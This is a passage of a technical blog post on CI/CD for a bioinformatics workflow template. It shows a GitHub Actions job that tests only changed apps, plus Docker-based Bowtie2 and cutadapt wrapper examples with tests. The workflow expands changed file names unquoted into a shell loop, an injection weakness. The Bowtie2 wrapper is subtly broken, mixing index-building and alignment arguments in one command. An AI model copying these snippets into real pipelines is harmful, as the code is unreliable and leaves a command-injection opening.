style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> ubuntu</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">steps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. Detect changed files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">uses</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> tj</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">actions/changed</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">files@v46.0.5</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">id</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> changed</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">files</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">with</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> apps/</span><span class="token important" style="color:hsl(230, 8%, 24%);font-weight:bold">**</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">base</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> $</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> github.event.pull_request.base.ref </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. Run unit tests for changed apps</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Unit tests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">if</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> steps.changed</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">files.outputs.all_changed_files </span><span class="token tag" style="color:hsl(5, 74%, 59%)">!=</span><span class="token plain"> ''</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token scalar string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          for app in ${{ steps.changed-files.outputs.all_changed_files }}; do</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">            make -C $app unittest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          done</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. Run E2E tests for changed apps</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> E2E tests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">if</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> steps.changed</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">files.outputs.all_changed_files </span><span class="token tag" style="color:hsl(5, 74%, 59%)">!=</span><span class="token plain"> ''</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token scalar string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          for app in ${{ steps.changed-files.outputs.all_changed_files }}; do</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">            make -C $app e2e</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          done</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 4. Run all workflow E2E tests</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Workflow tests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token scalar string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          for workflow in workflows/*; do</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">            make -C $workflow e2e</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          done</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-it-works">How It Works<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#how-it-works" class="hash-link" aria-label="Direct link to How It Works" title="Direct link to How It Works" translate="no">​</a></h3>
<p><strong>Scenario 1: Edit <code>apps/fastqc/main.py</code></strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">GitHub detects change → Run only fastqc tests → ~30 seconds</span><br></span></code></pre></div></div>
<p><strong>Scenario 2: Edit <code>workflows/qc/main.py</code></strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">GitHub detects change → Run qc workflow E2E → ~2 minutes</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Includes fastqc + multiqc + orchestration</span><br></span></code></pre></div></div>
<p><strong>Scenario 3: Edit <code>README.md</code></strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">GitHub detects no code changes → Skip all tests</span><br></span></code></pre></div></div>
<p><strong>Performance benefit</strong>:</p>
<ul>
<li class="">Without optimization: All tests run (~10 min) for every PR</li>
<li class="">With optimization: Only affected tests run (~30 sec - 2 min)</li>
<li class=""><strong>Result: 5-10x faster feedback</strong> 🚀</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-4-example-apps-and-patterns">Part 4: Example Apps and Patterns<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#part-4-example-apps-and-patterns" class="hash-link" aria-label="Direct link to Part 4: Example Apps and Patterns" title="Direct link to Part 4: Example Apps and Patterns" translate="no">​</a></h2>
<p>The template works for any bioinformatics tool wrapped in Python. Here are common patterns:</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="pattern-1-docker-based-tool-wrapper">Pattern 1: Docker-Based Tool Wrapper<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#pattern-1-docker-based-tool-wrapper" class="hash-link" aria-label="Direct link to Pattern 1: Docker-Based Tool Wrapper" title="Direct link to Pattern 1: Docker-Based Tool Wrapper" translate="no">​</a></h3>
<p>Most bioinformatics tools are containerized. Wrap them in Python:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># apps/bowtie2/main.py</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">run_bowtie2_alignment</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">reference</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> output_bam</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Align reads using Bowtie2 via Docker."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cmd </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"docker"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"run"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"--rm"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"-v"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">Path</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">cwd</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">Path</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">cwd</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"biocontainers/bowtie2:v2.5.1_cv1"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"bowtie2-build"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> reference</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"index"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"-x"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"index"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"-1"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"-2"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"-S"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> output_bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    subprocess</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> check</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># apps/bowtie2/tests/test_e2e.py</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">test_bowtie2_alignment_e2e</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">reference_fasta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq_files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Test alignment with real (dummy) data."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    run_bowtie2_alignment</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token plain">reference_fasta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token plain">fastq_files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"output.bam"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> Path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"output.bam"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">exists</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="pattern-2-python-library-wrapper">Pattern 2: Python Library Wrapper<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#pattern-2-python-library-wrapper" class="hash-link" aria-label="Direct link to Pattern 2: Python Library Wrapper" title="Direct link to Pattern 2: Python Library Wrapper" translate="no">​</a></h3>
<p>Some tools have Python packages. Use them directly:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># apps/cutadapt/main.py</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> cutadapt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">trim_adapters</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> output_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Trim adapters from FASTQ files."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    Path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">output_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">mkdir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">exist_ok</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Use cutadapt Python API</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    adapter </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"AGATCGGAAGAGC"</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Common Illumina adapter</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    results </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> cutadapt</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">main</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"-a"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> adapter</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"-A"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> adapter</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"-o"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">output_dir</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">/trimmed_R1.fastq.gz"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"-p"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">output_dir</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">/trimmed_R2.fastq.gz"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> results</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># apps/cutadapt/tests/test_e2e.py</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">test_trim_adapters_e2e</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq_files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> tmp_path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Test adapter trimming."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    trim_adapters</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq_files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq_files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">tmp_path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">tmp_path </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"trimmed_R1.fastq.gz"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">exists</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">tmp_path </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"trimmed_R2.fastq.gz"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">exists</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
